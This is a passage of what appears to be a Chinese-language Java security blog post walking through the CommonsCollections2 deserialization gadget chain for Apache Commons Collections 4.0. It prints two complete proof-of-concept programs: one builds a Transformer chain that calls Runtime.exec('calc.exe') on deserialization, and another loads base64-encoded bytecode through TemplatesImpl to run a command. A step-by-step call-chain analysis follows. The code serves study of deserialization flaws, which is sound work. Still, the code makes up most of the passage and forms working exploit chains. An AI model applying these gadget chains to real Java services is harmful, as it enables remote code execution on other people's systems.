+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;; <br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123; <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <br>                           <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>	<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;), <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;),<br>&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br></code></pre></td></tr></table></figure>
+
+<p>再创建一个<code>TransformingComparator</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformerChain);<br></code></pre></td></tr></table></figure>
+
+<p>然后我们需要实例化<code>PriorityQueue</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">PriorityQueue</span><span class="hljs-params">(<span class="hljs-type">int</span> initialCapacity,</span><br><span class="hljs-params">                         Comparator&lt;? <span class="hljs-built_in">super</span> E&gt; comparator)</span> &#123;<br>        <span class="hljs-comment">// Note: This restriction of at least one is not actually needed,</span><br>        <span class="hljs-comment">// but continues for 1.5 compatibility</span><br>        <span class="hljs-keyword">if</span> (initialCapacity &lt; <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>();<br>        <span class="hljs-built_in">this</span>.queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[initialCapacity];<br>        <span class="hljs-built_in">this</span>.comparator = comparator;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>第一个参数是初始化的大小，至少要两个才能触发<code>排序</code>和<code>比较</code>，所以填入2，第二个参数是<code>Comparator</code>传入之前创建的comparator</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator); <br>queue.add(<span class="hljs-number">1</span>);<br>queue.add(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure>
+
+<p>后⾯随便添加了2个数字进去，这⾥可以传⼊⾮null的任意对象，因为我们的Transformer是忽略传⼊参 数的。</p>
+<p>最后，将真正的恶意Transformer设置上：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br></code></pre></td></tr></table></figure>
+
+<p>完整POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)<br>        &#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,<br>                        Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">TransformingComparator</span>(transformerChain);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br>        setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="进阶POC"><a href="#进阶POC" class="headerlink" title="进阶POC"></a>进阶POC</h3><p>前面我们学习了<code>TemplatesImpl</code>不使用<code>Transformer</code>数组的形式构造，下面我们构造一个POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAADQAMwoABwAlCgAmACcIACgKACYAKQcAKgcAKwcALAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTEV4ZWNUZXN0OwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAA1TdGFja01hcFRhYmxlBwArBwAqAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAA1FeGVjVGVzdC5qYXZhDAAaABsHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAhFeGVjVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAAAAAAEAAEACAAJAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAMAAwAAAAgAAMAAAABAA0ADgAAAAAAAQAPABAAAQAAAAEAEQASAAIAEwAAAAQAAQAUAAEACAAVAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAARAAwAAAAqAAQAAAABAA0ADgAAAAAAAQAPABAAAQAAAAEAFgAXAAIAAAABABgAGQADABMAAAAEAAEAFAABABoAGwABAAoAAABqAAIAAgAAABIqtwABuAACEgO2AARXpwAETLEAAQAEAA0AEAAFAAMACwAAABYABQAAABIABAAUAA0AFwAQABUAEQAYAAwAAAAMAAEAAAASAA0ADgAAABwAAAAQAAL/ABAAAQcAHQABBwAeAAAJAB8AIAABAAoAAAArAAAAAQAAAAGxAAAAAgALAAAABgABAAAAHAAMAAAADAABAAAAAQAhACIAAAABACMAAAACACQ=&quot;</span>;<br>        <span class="hljs-type">byte</span>[] bytes= Base64.getDecoder().decode(s);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(obj);<br>        queue.add(obj);<br><br>        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h4><p>我们从简单分析一下这条链子：</p>
+<p>首先创建一个<code>TemplatesImpl</code>对象<code>obj</code>，</p>
+<ul>
+<li><p>使用反射的方式设置<code>_bytecodes</code>，内容是恶意的字节码数组，</p>
+</li>
+<li><p>设置<code>_name</code>代表字节码反序列化文件的名字为<code>HelloTemplatesImpl</code></p>
+</li>
+<li><p><code>_tfactory</code>设置为<code>TransformerFactoryImpl</code>对象，防止为<code>null</code>返回导致不成功</p>
+</li>
+</ul>
+<p>然后创建一个<code>InvokerTransformer</code>对象，调用方法本来需要调用<code>newTransformer()</code>方法，但是先传入<code>toString()</code>，防止干扰</p>
+<p>然后需要找一个类去调用<code>InvokerTransformer#transform()</code>方法，我们可以找到<code>TransformingComparator</code>类，<code>TransformingComparator#compare()</code>方法可以调用<code>transform()</code>方法，并且可以控制形参</p>
+<p>如何调用<code>TransformingComparator#compare()</code>方法，可以追溯到<code>PriorityQueue#readObjct()</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in size, and any hidden stuff</span><br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Read in (and discard) array length</span><br>        s.readInt();<br><br>        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);<br>        queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br><br>        <span class="hljs-comment">// Read in all elements.</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>            queue[i] = s.readObject();<br><br>        <span class="hljs-comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br>        <span class="hljs-comment">// spec has never explained what that might be.</span><br>        heapify();<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个方法很重要，会根据<code>PriorityQueue</code>传入形参的大小形成相应大小的队列</p>
+<p>从<code>readObject()</code>方法可以形成一个调用链（queue的值很关键）</p>
+<p><img src="https://s2.loli.net/2023/07/20/axn4EBu9zJkwTfp.png" srcset="/img/loading.gif" lazyload alt="image-20230720164025961"></p>
+<p>我们首先需要创建一个<code>PriorityQueue</code>对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// `2`代表队列大小为2</span><br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br></code></pre></td></tr></table></figure>
+
+<p>然后需要往队列里面添加两个值，这一次添加的值很重要，不能随便添加（<code>Comparator#compare()</code>方法调用<code>transform()</code>方法需要传入<code>TemplatesImpl</code>对象）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">queue.add(obj);<br>queue.add(obj);<br></code></pre></td></tr></table></figure>
+
+<p>我们分析一下<code>PriorityQueue#add()</code>方法的执行过程：</p>
+<p><img src="https://s2.loli.net/2023/07/20/QX1OasrMSBfEUlk.png" srcset="/img/loading.gif" lazyload alt="image-20230720165831296"></p>
+<p>到这里我们就可以理解为什么之前要将<code>InvokerTransform</code>中方法换为<code>toString()</code>了，威为的是防止提前触发<code>compare()</code>方法</p>
+<p>在<code>add()</code>之后，我们将<code>InvokerTransformer</code>的<code>iMethodName</code>从<code>toString</code>改为<code>newTransformer</code>就大功告成了</p>
+<h4 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue#readObject()<br>    heapify()<br>    	siftDown()<br>    		siftDownUsingComparator()<br>    			Comparator#compare()<br>    				InvokerTransformer#transform()<br>    					...<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://leekosss.github.io/2023/08/24/[java安全]CommonsCollections2(4.0)/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年8月9日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/%5Bjava%E5%AE%89%E5%85%A8%5DCommonsCollections6/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/%5Bjava%E5%AE%89%E5%85%A8%5DCommonsCollections1(TransformedMap)/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
